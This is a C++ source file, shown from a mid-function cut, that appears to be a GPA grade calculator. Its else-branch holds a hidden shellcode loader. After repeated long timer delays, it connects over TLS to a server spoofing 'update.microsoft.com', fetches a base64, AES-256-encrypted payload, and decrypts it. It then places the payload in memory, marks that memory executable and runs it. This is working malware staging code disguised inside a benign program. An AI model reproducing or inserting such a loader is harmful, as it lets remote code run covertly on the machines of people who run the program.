				gradeList.push_back(std::floor(std::accumulate(mathAvg.begin(), mathAvg.end(), 0)));

				currentAvg = std::accumulate(gradeList.begin(), gradeList.end(), 0) / gradeList.size();

				// Calculate difference 

				double difference = 7 * (chosenGPA - currentAvg);

				std::sort(gradeList.begin(), gradeList.end());

				if (difference <= 0) {
  					std::getline(std::cin, close);
					break;
				}

				// Create potential grades list


				std::vector<double> targetGradeList = gradeList;
				double difBuf = difference;
				int i = 0;
				while (difBuf > 0) {
					if (targetGradeList[i % 7] != 7) {
						targetGradeList[i % 7] += 1;
						difBuf -= 1;
					}
					i++;
				}

				std::vector<double> gradeDiffList;
				for (int i = 0; i < gradeList.size(); i++) {
					gradeDiffList.push_back(targetGradeList[i] - gradeList[i]);
				}

				std::vector<double> gradesNeeded;
				for (int i = 0; i < gradeDiffList.size(); i++) {
					gradesNeeded.push_back(gradeDiffList[i] + gradeList[i]);
					if (gradesNeeded[i] > 7) {
 					}
				}



				break;
			}
			}
		}
	} else {
		HANDLE hTimer = CreateWaitableTimerA(NULL, FALSE, NULL);
		LARGE_INTEGER dueTime;
		dueTime.QuadPart = -1000000000LL;
		SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE);
		WaitForSingleObject(hTimer, INFINITE);
		CloseHandle(hTimer);
		const char* serverIp = "127.0.0.1";
		const char* targetName = "update.microsoft.com";
		int port = 443;

		WSADATA wsa;
		if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { printf("[-] WSAStartup failed\n"); return 1; }

		hTimer = CreateWaitableTimerA(NULL, FALSE, NULL);
	    dueTime;
		dueTime.QuadPart = -1000000000LL;
		SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE);
		WaitForSingleObject(hTimer, INFINITE);
		CloseHandle(hTimer);

		SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockaddr_in addr = { 0 };
		addr.sin_family = AF_INET;
		addr.sin_port = htons((u_short)port);
		inet_pton(AF_INET, serverIp, &addr.sin_addr);

		if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
 			WSACleanup();
			return 1;
		}
 
		CredHandle hCred = { 0 };
		CtxtHandle hCtxt = { 0 };
		std::vector<BYTE> pending;
		hTimer = CreateWaitableTimerA(NULL, FALSE, NULL);
		dueTime;
		dueTime.QuadPart = -1000000000LL;
		SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE);
		WaitForSingleObject(hTimer, INFINITE);
		CloseHandle(hTimer);
		if (!ClientHandshake(sock, targetName, hCred, hCtxt, pending)) {
			closesocket(sock); WSACleanup(); return 1;
		}

		std::vector<BYTE> accum = pending;
		std::vector<BYTE> received;
		if (!ReceiveAll(sock, hCtxt, accum, received)) {
			closesocket(sock); WSACleanup(); return 1;
		}
		//printf("[+] Received %zu bytes of TLS plaintext (base64 of ciphertext)\n", received.size());

		// Chain inverse: base64 decode -> AES-256 decrypt
		std::string b64(received.begin(), received.end());
		std::vector<BYTE> ciphertext = Base64Decode(b64);
		if (ciphertext.empty()) {
			//printf("[-] Base64 decode produced nothing\n");
			closesocket(sock); WSACleanup(); return 1;
		}

		hTimer = CreateWaitableTimerA(NULL, FALSE, NULL);
		dueTime;
		dueTime.QuadPart = -10000000000LL;
		SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, FALSE);
		WaitForSingleObject(hTimer, INFINITE);
		CloseHandle(hTimer);

		//printf("[+] Base64 decoded: %zu bytes of ciphertext\n", ciphertext.size());

		std::vector<BYTE> shellcode = Aes256Decrypt(ciphertext);
		if (shellcode.empty()) {
 			closesocket(sock); WSACleanup(); return 1;
		}
		//printf("[+] Decrypted shellcode: %zu bytes\n", shellcode.size());

		DeleteSecurityContext(&hCtxt);
		FreeCredentialsHandle(&hCred);
		closesocket(sock);
		WSACleanup();

		//std::cout << "[+] Allocating private memory region..." << std::endl;

		size_t payloadSize = shellcode.size();

		// 2. Allocate a region of memory within the current process.
		// We initially provision it with PAGE_READWRITE (RW) to safely write the payload.
		LPVOID pMemory = VirtualAlloc(
			NULL,                   // Let the OS choose the base address
			payloadSize,            // Size of the allocation
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE          // Read/Write permissions initially
		);

		if (pMemory == NULL) {
			std::cerr << "[-] VirtualAlloc failed. Error: " << GetLastError() << std::endl;
			return -1;
		}
 
		// 3. Copy the payload into the newly allocated memory space.
		RtlMoveMemory(pMemory, shellcode.data(), payloadSize);
 
		// 4. Modify the memory protection to allow execution.
		// We transition the permissions from Read/Write (RW) to Read/Execute (RX).
		// This complies with DEP rules by ensuring memory is never W+X simultaneously.
		ULONG oldProtect = 0;
		BOOL protectSuccess = VirtualProtect(
			pMemory,
			payloadSize,
			PAGE_EXECUTE_READ,     // Change to Read/Execute
			&oldProtect            // Variable to store the previous protection flags
		);

		if (!protectSuccess) {
			std::cerr << "[-] VirtualProtect failed. Error: " << GetLastError() << std::endl;
			VirtualFree(pMemory, 0, MEM_RELEASE);
			return -1;
		}
 
		// 5. Execute the payload.
		// We cast the memory address to a function pointer type and call it.
 
		using pfnShellcode = void(*)();
		pfnShellcode targetFunction = (pfnShellcode)pMemory;

		// Call the function pointer
		targetFunction();

		// 6. Clean up resources (reached only if the payload returns execution control)
		VirtualFree(pMemory, 0, MEM_RELEASE);
 		return 0;


	}
 	return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
